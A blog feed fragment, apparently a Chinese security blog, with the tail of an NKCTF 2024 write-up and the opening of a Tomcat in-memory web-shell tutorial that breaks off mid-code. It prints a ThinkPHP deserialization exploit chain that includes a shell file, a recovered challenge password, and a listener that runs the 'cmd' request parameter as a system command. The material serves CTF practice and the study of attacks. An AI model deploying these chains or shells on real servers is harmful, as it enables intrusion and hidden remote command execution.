keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$encode</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ckeyLength</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">?</span> <span class="token variable">$key</span> <span class="token punctuation">:</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$defaultKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//解密密匙</span>        <span class="token variable">$keya</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//做数据完整性验证  </span>        <span class="token variable">$keyb</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//用于变化生成的密文 (初始化向量IV)</span>        <span class="token variable">$keyc</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$ckeyLength</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$cryptkey</span> <span class="token operator">=</span> <span class="token variable">$keya</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$keya</span> <span class="token punctuation">.</span> <span class="token variable">$keyc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token variable">$keyLength</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cryptkey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span> <span class="token variable">$ckeyLength</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stringLength</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$rndkey</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$rndkey</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$cryptkey</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">%</span> <span class="token variable">$keyLength</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$box</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打乱密匙簿，增加随机性</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$rndkey</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 加解密，从密匙簿得出密匙进行异或，再转成字符</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$stringLength</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>             <span class="token variable">$result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$theTime</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resultStr</span>  <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$theTime</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token variable">$theTime</span> <span class="token operator">-</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$keyb</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$resultStr</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$encode</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$resultStr</span> <span class="token operator">=</span> <span class="token function">rawurldecode</span><span class="token punctuation">(</span><span class="token variable">$resultStr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$resultStr</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token string">"tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"2&amp;$%@(*@(djfhj1923"</span><span class="token punctuation">;</span><span class="token variable">$strings</span> <span class="token operator">=</span> Mcrypt<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token string">"tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$strings</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// echo Mcrypt::decode('tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI',"2&amp;$%@(*@(djfhj1923");</span></code></pre><p><img src="/Blogimages/2024NKCTF/image-20240324093124-fulqbrz.png" alt="image">​</p><p>利用密码!@!@!@!@NKCTFChu0登陆</p><p><img src="/Blogimages/2024NKCTF/a047f4f373594d23471e8bf64cc44d4f-20240324093334-rk63for.png" alt="a047f4f373594d23471e8bf64cc44d4f"></p><p>进去后可以看到一个文件</p><p>内容是：</p><p><img src="/Blogimages/2024NKCTF/c001a0c206e999ea08c2805be146b0fc-20240324093356-1twozi1.png" alt="c001a0c206e999ea08c2805be146b0fc"></p><p>这样就可以和include串起来了：</p><p>exp：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">View</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$engine</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">"Loginout"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">engine</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"data/files/shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">ArrayAccess</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">ArrayIterator</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Countable</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">IteratorAggregate</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">JsonSerializable</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Traversable</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Collection</span> <span class="token keyword">implements</span> <span class="token class-name">ArrayAccess</span><span class="token punctuation">,</span> Countable<span class="token punctuation">,</span> IteratorAggregate<span class="token punctuation">,</span> JsonSerializable<span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$items</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * Collection constructor.     * @access public     * @param  array $items 数据     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">items</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement getIterator() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetExists</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement offsetExists() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetGet</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement offsetGet() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetSet</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement offsetSet() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetUnset</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement offsetUnset() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement count() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">jsonSerialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement jsonSerialize() method.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Collection</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Process</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Collection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Collection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serialize</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>bp发包：</p><p><img src="/Blogimages/2024NKCTF/9862094c80870033e461ba949ce2fc5a-20240324093438-bgg140b.png" alt="9862094c80870033e461ba949ce2fc5a"></p><p>得到flag：</p><p><img src="/Blogimages/2024NKCTF/3299cfa76224eb2a964b6c073d4d5bcb-20240324093514-gweqp3t.png" alt="3299cfa76224eb2a964b6c073d4d5bcb"></p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马</title>
      <link href="/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>描述Servlet3.0后允许动态注册组件</p><p>这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。</p><p>而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat-catalina<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>9.0.55<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p><strong>关键在于 JSP-&gt;可识别类（恶意类）</strong></p><p>所以需要看写在java文件中被系统调用时的堆栈过程，利用jsp技术把这个注册过程写入jsp，在访问jsp之后就会执行这个逻辑以此注入内存马</p><pre class=" language-xml"><code class="language-xml">问题1：注入内存马之后是访问就会触发动态注册的动作还是注入就自动执行动态注册的动作？访问后生效</code></pre><h2 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h2><p>Servlet有三种监听器：</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>这三种最合适的莫过于ServletRequestListener，只要访问Servlet的任何资源都会触发这个监听器</p><p>创建Listener：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletRequestEvent<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletRequestListener<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>WebListener<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token annotation punctuation">@WebListener</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletListener</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span> <span class="token punctuation">(</span>ServletRequestEvent sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"requestDestroyed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span> <span class="token punctuation">(</span>ServletRequestEvent sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ServletRequest servletRequest <span class="token operator">=</span> sre<span class="token punctuation">.</span><span class="token function">getServletRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String cmd <span class="token operator">=</span> servletRequest<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>验证：</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240301165810-t0uke8b.png" alt="image">​</p><p>调用堆栈如下：</p><pre class=" language-sh"><code class="language-sh">requestInitialized:13, Shell_Listener (org.example.demo)fireRequestInitEvent:5638, StandardContext (org.apache.catalina.core)invoke:116, StandardHostValve (org.apache.catalina.core)invoke:93, ErrorReportValve (org.apache.catalina.valves)invoke:670, AbstractAccessLogValve (org.apache.catalina.valves)invoke:74, StandardEngineValve (org.apache.catalina.core)service:342, CoyoteAdapter (org.apache.catalina.connector)service:390, Http11Processor (org.apache.coyote.http11)process:63, AbstractProcessorLight (org.apache.coyote)process:928, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1794, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:52, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang)</code></pre><p>调用Listener的关键步骤<code>fireRequestInitEvent:5638, StandardContext (org.apache.catalina.core)</code>​</p><p>跟进看函数逻辑：</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">fireRequestInitEvent</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object instances<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>instances <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>instances<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ServletRequestEvent event <span class="token operator">=</span>                    <span class="token keyword">new</span> <span class="token class-name">ServletRequestEvent</span><span class="token punctuation">(</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>Object instance <span class="token operator">:</span> instances<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>instance <span class="token keyword">instanceof</span> <span class="token class-name">ServletRequestListener</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                ServletRequestListener listener <span class="token operator">=</span> <span class="token punctuation">(</span>ServletRequestListener<span class="token punctuation">)</span> instance<span class="token punctuation">;</span>                <span class="token 